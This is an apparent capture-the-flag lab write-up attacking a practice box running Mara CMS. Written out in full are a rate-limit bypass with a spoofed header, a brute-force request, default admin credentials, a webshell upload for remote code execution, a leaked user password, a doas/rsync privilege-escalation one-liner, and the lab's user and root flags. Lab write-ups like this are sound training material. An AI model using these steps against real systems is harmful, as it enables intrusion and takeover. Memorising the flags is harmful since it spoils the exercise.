# writeups

```
8085/tcp  open     http             syn-ack     Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET OPTIONS POST HEAD
|_http-title: Spinner
22/tcp    open     ssh              syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bda4a3ae66681d74e1c06aeb2b9bf333 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7zuGtMGKQdFrh6Y8Dgwdo7815klLm7VzG05KNvT112MyF41Vxz+915iRz9nTSQ583i1cmjHp+q+fMq+QGiO0iwIdYN72jop6oFxqyaO2ZjBE3grWHSP2xMsTZc7qXgPu9ZxzVAfc/4mETA8B00yc6XNApJUwfJOYz/qt/pb0WHDVBQLYesg+rrr3UZDrj9L7KNFlW74mT0nzace0yqtcV//dgOMiG8CeS6TRyUG6clbSUdr+yfgPOrcUwhTCMRKv2e30T5naBZ60e1jSuXYmQfmeZtDZ4hdsBWDfOnGnw89O9Ak+VhULGYq/ZxTh31dnWBULftw/l6saLaUJEaVeb
|   256 9adb73790c72be051a8673dcac6d7aef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENNM4XJDFEnfvomDQgg0n7ZF+bHK+/x0EYcjrLP2BGgytEp7yg7A36KajE2QYkQKtHGPamSRLzNWmJpwzaV65w=
|   256 648d5c79dee1f73f087cebb7b324641f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOd1NxUo0xJ3krpRI1Xm8KMCFXziZngofs/wjOkofKKV
30/tcp    filtered unknown          no-response
80/tcp    open     http             syn-ack     Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Susta
```

I go on the 8085, I found a spinner game, but when i'm looking a little 
closer nikto the told me

```
+ /: Uncommon header 'x-ratelimit-remaining' found, with contents: 8.
+ /: Uncommon header 'x-ratelimit-reset' found, with contents: 1680816879.
+ /: Uncommon header 'x-ratelimit-limit' found, with contents: 10.
```
then I go and look for xrateLimit, and I see we can bypass rate limit(header/captcha) 
it with various techniques like this one for header `X-Remote-Addr : IP`

### resource : https://infosecwriteups.com/bypassing-rate-limit-like-a-pro-5f3e40250d3c


so now I'll just choose copy/paste that in the client req, and after that
try to fuzz the spinner just to find the right number, it looks like that the
request in the intruder of burpsuite where I use the payload sniper-number/1

```
POST /home HTTP/1.1
Host: 10.10.199.187:8085
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://10.10.199.187:8085
Connection: close
Referer: http://10.10.199.187:8085/home
Upgrade-Insecure-Requests: 1
X-Remote-Addr: 127.0.0.1

number=§890909009§
```
we know that the number are 5 length, so in the payload set 10000,99999 so like that we
cover every numbers, it'll be easy for us the find the right one, but it takes me so much
time with burp I passed away this step, and I after I found the right number I got the path

`path: /YouGotTh3P@th` 
but the path it's for the 80 port, not the 8085 spiner, ok  then we arrived on the CMS, 
the name is *Mara CMS*, and the version *7.2*( about page).

 
=== dir listing ===

```
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 14021]
/about.php            (Status: 200) [Size: 8727]
/contact.php          (Status: 200) [Size: 7728]
/blog                 (Status: 301) [Size: 327] [--> http://10.10.199.187/YouGotTh3P@th/blog/]
/img                  (Status: 301) [Size: 326] [--> http://10.10.199.187/YouGotTh3P@th/img/]
/sitemap.php          (Status: 200) [Size: 1446]
/gallery.php          (Status: 500) [Size: 0]
/.php                 (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 326] [--> http://10.10.199.187/YouGotTh3P@th/css/]
/template             (Status: 301) [Size: 331] [--> http://10.10.199.187/YouGotTh3P@th/template/]
/log                  (Status: 301) [Size: 326] [--> http://10.10.199.187/YouGotTh3P@th/log/]
/theme                (Status: 301) [Size: 328] [--> http://10.10.199.187/YouGotTh3P@th/theme/]
```
maybe the /log can have some interesting infos, le'ts see. after a while I see that various .txt file
where each of them said something, like dirs (`preview.php, lorem.php`) and also `User : admin`, so in 
the lorem.php I saw `Log in with admin and changeme to try the editor.` that seems some creds, I click in
the admin link right in this previous text and I got the login page, and I use the creds and I was connected
like admin even if before that my browser notif me smthing about the creds, but nvermind.



Guess what? I found an 7.5 exploit RCE, maybe he could work on this one too, the 1st step is navigte to
this dir

`http://10.10.199.187/YouGotTh3P@th/codebase/dir.php?type=filenew`
where i am suposed to upload a file like a webshell, so I have this message

```
OK: php-reverse.php uploaded.
Files saved to: /var/www/html/YouGotTh3P@th/img
```
yes the webshell works, now priv escal to the kiran user, and after to root. the problem 
I couldnt read user.txt so I back to var/www/ and I found a backups on /var/ into this 
dir I found some interesting file, but I still couldnt read them expect the first one
called `.bak.passwd`, after that  i got the kiran creds

`kiran:x:1002:1002:trythispasswordforuserkiran:/home/kiran:`, the flag `6b18f161b4de63b5f72577c737b7ebc8`
and now let's go for root flag, so the hint said 'we dont always need sudo', so we'll 
look for sudo alternatives on googlem and I found the best sudo alternatives

```
    pkexec. 
    doas. ...
    su. ...
    dzdo.
```
so let's try one of them especially doas, beacuse pkexec ask for root password, so le'ts 
go on GTFObins to see if they have some payload to help us got the root.

I check the doas.conf with the command `whereis doas.conf` and I found

```
cat /usr/local/etc/doas.conf
 permit nopass kiran as root cmd rsync
```
that mean rsync command can execute like root without any problem, let's see.
I found that
`rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` let's paste it and see but
don't forget to add `doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`, and
here we go the root.

`afbb1696a893f35984163021d03f6095`  
